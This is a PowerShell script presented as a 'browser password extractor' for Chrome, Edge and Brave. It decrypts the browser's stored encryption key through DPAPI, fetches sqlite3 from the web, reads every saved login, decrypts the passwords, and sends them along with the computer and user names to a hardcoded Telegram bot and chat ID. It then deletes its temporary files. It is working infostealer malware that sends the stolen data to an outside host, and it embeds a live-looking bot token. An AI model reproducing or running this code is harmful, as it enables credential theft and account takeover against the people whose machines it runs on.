# Simple Browser Password Extractor
# Supports Chrome, Edge, Brave

param(
    [string]$TelegramBotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w",
    [string]$TelegramChatID = "2146236602"
)

# Send message to Telegram
function Send-TelegramMessage {
    param([string]$Message)
    
    try {
        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
        $body = @{chat_id = $TelegramChatID; text = $Message; parse_mode = "HTML"}
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
        return $response.ok
    } catch { return $false }
}

# Send file to Telegram
function Send-TelegramFile {
    param([string]$FilePath, [string]$Caption)
    
    try {
        if (-not (Test-Path $FilePath)) { return $false }
        
        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [IO.File]::ReadAllBytes($FilePath)
        $fileContent = [Text.Encoding]::UTF8.GetString($fileBytes)
        
        $bodyLines = @(
            "--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $TelegramChatID,
            "--$boundary", "Content-Disposition: form-data; name=`"caption`"", "", $Caption,
            "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream", "", $fileContent, "--$boundary--"
        ) -join $LF

        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        return $response.ok
    } catch { return $false }
}

# Get browser paths
function Get-BrowserPaths {
    $browsers = @{}
    
    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromePath) { $browsers.Chrome = $chromePath }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgePath) { $browsers.Edge = $edgePath }
    
    # Brave
    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    if (Test-Path $bravePath) { $browsers.Brave = $bravePath }
    
    return $browsers
}

# Get encryption key from Local State
function Get-EncryptionKey {
    param([string]$BrowserPath)
    
    $localStatePath = "$BrowserPath\Local State"
    if (-not (Test-Path $localStatePath)) { return $null }
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove DPAPI prefix (first 5 bytes)
        if ($encryptedKey.Length -gt 5) {
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
        }
        
        # Use Windows DPAPI to decrypt
        Add-Type -AssemblyName System.Security
        $decryptedKey = [Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey,
            $null,
            [Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $decryptedKey
    } catch {
        Write-Host "Error getting encryption key: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Decrypt password
function Decrypt-Password {
    param([byte[]]$EncryptedData, [byte[]]$Key)
    
    if (-not $EncryptedData -or $EncryptedData.Length -eq 0) { return $null }
    
    try {
        # Check for AES-GCM encryption (v10 or v20)
        if ($EncryptedData.Length -ge 3) {
            $prefix = [Text.Encoding]::ASCII.GetString($EncryptedData[0..2])
            
            if ($prefix -eq "v10" -or $prefix -eq "v20") {
                if ($EncryptedData.Length -lt 15) { return $null }
                
                # AES-GCM decryption
                $iv = $EncryptedData[3..14]
                $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]
                $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
                
                # Use .NET's AesGcm if available
                try {
                    $aes = New-Object Security.Cryptography.AesGcm($Key)
                    $plaintext = New-Object byte[] $ciphertext.Length
                    $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
                    return [Text.Encoding]::UTF8.GetString($plaintext)
                } catch {
                    # Fallback to DPAPI for older encryption
                    return Decrypt-WithDPAPI $EncryptedData
                }
            }
        }
        
        # DPAPI decryption for older versions
        return Decrypt-WithDPAPI $EncryptedData
        
    } catch {
        return $null
    }
}

# DPAPI decryption
function Decrypt-WithDPAPI {
    param([byte[]]$EncryptedData)
    
    try {
        Add-Type -AssemblyName System.Security
        $decrypted = [Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData,
            $null,
            [Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return $null
    }
}

# Extract passwords from browser
function Extract-BrowserPasswords {
    param([string]$BrowserName, [string]$BrowserPath, [byte[]]$Key)
    
    $results = @()
    
    # Check default profile
    $defaultProfile = "$BrowserPath\Default"
    if (Test-Path "$defaultProfile\Login Data") {
        $results += Extract-FromProfile $BrowserName "Default" $defaultProfile $Key
    }
    
    # Check other profiles
    $profiles = Get-ChildItem -Path $BrowserPath -Directory -Filter "Profile *"
    foreach ($profile in $profiles) {
        if (Test-Path "$($profile.FullName)\Login Data") {
            $results += Extract-FromProfile $BrowserName $profile.Name $profile.FullName $Key
        }
    }
    
    return $results
}

# Extract from specific profile
function Extract-FromProfile {
    param([string]$BrowserName, [string]$ProfileName, [string]$ProfilePath, [byte[]]$Key)
    
    $dbPath = "$ProfilePath\Login Data"
    if (-not (Test-Path $dbPath)) { return @() }
    
    $tempDb = "temp_$($BrowserName)_$($ProfileName -replace '[^a-zA-Z0-9]', '_').db"
    $passwords = @()
    
    try {
        Copy-Item $dbPath $tempDb -Force
        
        # Download sqlite3 if not present
        if (-not (Test-Path "sqlite3.exe")) {
            $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
            $tempZip = "sqlite-temp.zip"
            Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
            Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
            Remove-Item $tempZip, ".\sqlite-temp" -Recurse -Force
        }
        
        # Export data using sqlite3
        $tempCsv = "temp_data.csv"
        $query = "SELECT origin_url, username_value, password_value FROM logins;"
        & .\sqlite3.exe -csv -header $tempDb $query > $tempCsv
        
        if (Test-Path $tempCsv) {
            $data = Import-Csv $tempCsv
            Write-Host "  Found $($data.Count) logins in $BrowserName ($ProfileName)" -ForegroundColor Green
            
            foreach ($row in $data) {
                if ($row.password_value -and $row.username_value) {
                    $encryptedBytes = [Text.Encoding]::Default.GetBytes($row.password_value)
                    $password = Decrypt-Password -EncryptedData $encryptedBytes -Key $Key
                    
                    if ($password) {
                        $passwords += [PSCustomObject]@{
                            Browser = $BrowserName
                            Profile = $ProfileName
                            URL = $row.origin_url
                            Username = $row.username_value
                            Password = $password
                        }
                    }
                }
            }
            
            Remove-Item $tempCsv -Force
        }
        
        Remove-Item $tempDb -Force
        
    } catch {
        Write-Host "  Error extracting from $BrowserName ($ProfileName): $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $passwords
}

# Main execution
Write-Host "üåê Browser Password Extractor" -ForegroundColor Cyan
Write-Host "=" * 50 -ForegroundColor Cyan
Write-Host "Scanning browsers..." -ForegroundColor Yellow
Write-Host ""

# Send start message
$startMsg = @"
üöÄ Starting Password Extraction
‚Ä¢ Computer: $env:COMPUTERNAME
‚Ä¢ User: $env:USERNAME
‚Ä¢ Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
Send-TelegramMessage -Message $startMsg | Out-Null

# Get system info
$systemInfo = @{
    Computer = $env:COMPUTERNAME
    User = $env:USERNAME
    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

# Get all passwords
$allPasswords = @()
$browsers = Get-BrowserPaths

foreach ($browserName in $browsers.Keys) {
    Write-Host "üîç Scanning $browserName..." -ForegroundColor Yellow
    
    $browserPath = $browsers[$browserName]
    $key = Get-EncryptionKey -BrowserPath $browserPath
    
    if ($key) {
        $passwords = Extract-BrowserPasswords -BrowserName $browserName -BrowserPath $browserPath -Key $key
        $allPasswords += $passwords
        Write-Host "  ‚úì Found $($passwords.Count) passwords" -ForegroundColor Green
    } else {
        Write-Host "  ‚úó No encryption key found" -ForegroundColor Red
    }
    
    Write-Host ""
}

# Display results
if ($allPasswords.Count -gt 0) {
    Write-Host "üìã EXTRACTION RESULTS" -ForegroundColor Cyan
    Write-Host "=" * 50 -ForegroundColor Cyan
    Write-Host "Total passwords found: $($allPasswords.Count)" -ForegroundColor Green
    
    # Group by browser
    $grouped = $allPasswords | Group-Object Browser
    
    foreach ($group in $grouped) {
        Write-Host "`n$($group.Name): $($group.Count) passwords" -ForegroundColor Yellow
        Write-Host "-" * 40
        
        # Show first 5 entries
        $toShow = $group.Group | Select-Object -First 5
        foreach ($entry in $toShow) {
            Write-Host "  URL: $($entry.URL)" -ForegroundColor White
            Write-Host "  User: $($entry.Username)" -ForegroundColor Gray
            Write-Host "  Pass: $($entry.Password)" -ForegroundColor Green
            Write-Host ""
        }
        
        if ($group.Count -gt 5) {
            Write-Host "  ... and $($group.Count - 5) more" -ForegroundColor Gray
        }
    }
    
    # Save to JSON
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $filename = "passwords_$timestamp.json"
    
    $exportData = @{
        Metadata = $systemInfo
        Passwords = $allPasswords
    }
    
    $exportData | ConvertTo-Json -Depth 5 | Out-File $filename -Encoding UTF8
    Write-Host "`nüíæ Results saved to: $filename" -ForegroundColor Green
    
    # Send to Telegram
    if ($TelegramBotToken -and $TelegramChatID) {
        $caption = @"
Passwords Extracted
‚Ä¢ Computer: $($systemInfo.Computer)
‚Ä¢ User: $($systemInfo.User)
‚Ä¢ Total: $($allPasswords.Count) passwords
‚Ä¢ Time: $($systemInfo.Time)
"@
        
        if (Send-TelegramFile -FilePath $filename -Caption $caption) {
            Write-Host "üì§ Sent to Telegram" -ForegroundColor Green
            Remove-Item $filename -Force
        }
    }
    
} else {
    Write-Host "‚ùå No passwords found" -ForegroundColor Red
    $emptyMsg = "No passwords found on $($systemInfo.Computer) at $($systemInfo.Time)"
    Send-TelegramMessage -Message $emptyMsg | Out-Null
}

# Cleanup
if (Test-Path "sqlite3.exe") { Remove-Item "sqlite3.exe" -Force }
Get-ChildItem -Path "." -Filter "temp_*" | Remove-Item -Force

Write-Host "`n‚úÖ Extraction completed at $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green
